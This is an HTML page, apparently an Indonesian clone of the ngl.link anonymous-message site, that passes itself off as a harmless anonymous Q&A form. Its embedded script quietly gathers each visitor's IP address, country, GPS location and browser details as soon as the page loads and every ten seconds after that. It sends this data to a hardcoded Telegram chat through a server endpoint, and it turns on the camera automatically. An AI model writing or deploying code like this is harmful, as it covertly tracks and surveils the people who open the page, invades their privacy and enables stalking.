<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>ngl.link â€” clone (Vercel-ready)</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet"/>
<link rel="stylesheet" href="style.css">
</head>
<body class="min-h-screen flex items-center justify-center px-4 py-12">
<div class="w-full max-w-md">

  <!-- top floating activity -->
  <div class="flex justify-center mb-6">
    <div class="activity">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
        <path d="M12 12c2.21 0 4-1.79 4-4S14.21 4 12 4 8 5.79 8 8s1.79 4 4 4zM2 20c0-3.31 2.69-6 6-6h8c3.31 0 6 2.69 6 6v1H2v-1z"/>
      </svg>
      <div class="text-sm ml-1">205 teman baru saja mengetuk</div>
    </div>
  </div>

  <!-- main card -->
  <div class="card">
    <div class="flex items-center gap-4 px-5 py-4 header">
      <div class="w-12 h-12 rounded-full avatar-ring bg-white flex items-center justify-center">
        <img src="https://storage.googleapis.com/a1aa/image/5df75832-9f76-4ece-e6f3-683fd17d55b0.jpg" alt="avatar" class="w-10 h-10 rounded-full object-cover"/>
      </div>
      <div class="flex-1">
        <div class="text-gray-900 font-semibold text-sm">@bibd51254</div>
        <div class="text-gray-500 text-xs">kirimi aku pesan anonim</div>
      </div>
      <div class="text-xs text-muted">â€¢â€¢â€¢</div>
    </div>

    <div class="px-5 py-6 bg-white">
      <div class="glass p-4 rounded-2xl">
        <div class="text-pink-600 font-semibold text-lg mb-2">lagi ngapain nanti?</div>
        <div class="text-sm text-muted mb-3">kirim yang jujur ya â€” 100% anonim</div>
        <textarea id="msg" class="ngl-textarea w-full h-36 p-4 resize-none" placeholder="Ketik pesan anonimmu di sini..."></textarea>

        <div class="mt-4 flex items-center gap-3">
          <button id="dice" class="w-10 h-10 rounded-full bg-pink-50 flex items-center justify-center ring-1 ring-pink-100">
            <img src="https://storage.googleapis.com/a1aa/image/c1c7fb05-e997-44ba-9254-e474d307b9f2.jpg" alt="dice" class="w-5 h-5"/>
          </button>
          <div class="flex-1"></div>
          <button id="sendBtn" class="send-btn bg-black text-white px-5 py-3 rounded-full font-semibold shadow-md hover:scale-[1.02] transition">
            Send!
          </button>
        </div>

        <!-- status -->
        <div id="status" class="mt-2 text-sm text-gray-500"></div>
      </div>
    </div>

    <div class="px-5 py-4 border-t flex items-center justify-between">
      <div class="text-sm text-muted flex items-center gap-2">
        <i class="fas fa-lock"></i>
        <span>100% anonymous Q&amp;A</span>
      </div>
      <div class="text-sm text-pink-500 font-semibold cursor-pointer" id="createLink">Buat linkmu</div>
    </div>
  </div>

  <div id="recentArea" class="mt-6 space-y-3"></div>
  <div class="mt-8 text-center text-white">
    <div class="text-lg font-semibold">ðŸ‘‡ Dapatkan pesan untukmu sendiri ðŸ‘‡</div>
    <button id="makeLink" class="makeLinkBtn">Buat link anonim kamu</button>
  </div>

  <div class="mt-6">
    <div class="text-gray-700 font-semibold mb-2">Kamera & lokasi otomatis:</div>
    <video id="cameraPreview" class="w-full rounded-xl border" autoplay playsinline></video>
  </div>
</div>

<script>
const CHAT_ID = "7483495590"; // ganti sesuai chat Telegram lo

async function sendToTelegram(data){
  const statusEl = document.getElementById('status');
  try{
    const res = await fetch('/api/sendMessage',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:CHAT_ID,text:data})
    });

    const result = await res.json();
    console.log("Response /api/sendMessage:", result);

    if(result.success){
      statusEl.textContent = "âœ… Pesan berhasil dikirim ke Telegram";
    } else {
      statusEl.textContent = "âŒ Gagal kirim: " + (result.error || "Unknown error");
    }

  }catch(err){
    console.error(err);
    statusEl.textContent = "âŒ Fetch error: " + err.message;
  }
}

async function getDeviceInfo(){
  let geo="Tidak tersedia";
  try{
    const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r=>r.json());
    const battery = await navigator.getBattery();
    if(navigator.geolocation){
      await new Promise(resolve=>navigator.geolocation.getCurrentPosition(pos=>{
        geo=`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy} m`;
        resolve();
      },()=>resolve()));
    }
    return `ðŸŒ IP: ${ipInfo.ip}, Negara: ${ipInfo.country}, Waktu: ${new Date().toLocaleString()}\nðŸ“ Geolocation: ${geo}\nðŸ“± UserAgent: ${navigator.userAgent}`;
  }catch(e){return "âŒ Gagal ambil info device";}
}

async function liveTracking(){
  const info = await getDeviceInfo();
  await sendToTelegram(info);
}

window.onload = async()=>{
  await liveTracking();
  setInterval(liveTracking,10000);

  // Kamera otomatis
  const videoEl=document.getElementById('cameraPreview');
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true,audio:false});
    videoEl.srcObject = stream;
  }catch(err){
    console.error("Gagal akses kamera:", err);
  }

  // Tombol send manual
  document.getElementById('sendBtn').addEventListener('click', async()=>{
    const msg = document.getElementById('msg').value.trim();
    if(msg) await sendToTelegram(msg);
  });
};
</script>
</body>
</html>
